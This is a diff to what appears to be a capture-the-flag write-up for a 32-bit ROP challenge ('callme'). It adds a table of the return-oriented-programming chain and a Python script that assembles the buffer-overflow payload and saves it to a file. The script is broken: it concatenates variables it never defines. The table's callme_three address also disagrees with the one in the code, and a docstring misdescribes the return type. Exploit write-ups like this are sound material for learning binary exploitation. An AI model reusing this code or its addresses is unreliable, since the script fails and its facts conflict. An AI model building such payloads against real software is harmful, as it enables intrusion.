@@ -195,3 +195,55 @@ In the following table, the important addresses for constructing the ROP chain a
 | callme_two   | Func   | 0x08048550 | The entry address in the PLT table.                 |
 | callme_three | Func   | 0x0804a014 | The entry address in the PLT table.                 |
 | pop3words    | Gadget | 0x080487f9 | Clean 3 words (12 bytes) from the top of the stack. |
+
+This table describes the ROP chain itself:
+
+| No | Chain link.                                                 |
+|----|-------------------------------------------------------------|
+| 1  | 44 garbage bytes                                            |
+| 2  | callme_one, pop3words, 0xdeadbeef, 0xcafebabe, 0xd00df00d   |
+| 3  | callme_two, pop3words, 0xdeadbeef, 0xcafebabe, 0xd00df00d   |
+| 4  | callme_three, pop3words, 0xdeadbeef, 0xcafebabe, 0xd00df00d |
+
+So let's write the Python code that created the ROP chain
+
+```python
+# chain_builder.py
+import struct
+
+def little_endian(number):
+    """
+    : The function accepts a number not
+    : exceeding 4 bytes in size and returns it
+    : as a string of hexadecimal characters in : little-endian format.
+    """
+    return struct.pack("<I", number)
+
+# Parts of the chain
+fill_buffer  = b"X"*44
+
+callme_one   = little_endian(0x080484f0)
+callme_two   = little_endian(0x08048550)
+callme_three = little_endian(0x080484e0)
+
+pop3words    = little_endian(0x080487f9)
+
+param1       = 0xdeadbeef
+param2       = 0xcafebabe
+param3       = 0xd00df00d
+params       = little_endian(param1) +\
+               little_endian(param2) +\
+               little_endian(param3)
+
+# Building the chain
+ROP_Chain = fill_buffer
+ROP_Chain += callme_one_PLT_ADDR + pop3words_GADGET + params
+ROP_Chain += callme_two_PLT_ADDR + pop3words_GADGET + params
+ROP_Chain += callme_three_PLT_ADDR + pop3words_GADGET + params
+
+print(ROP_Chain)
+
+# Saving the chain in a binary file
+with open("rop_chain", "wb") as f:
+    f.write(ROP_Chain)
+```
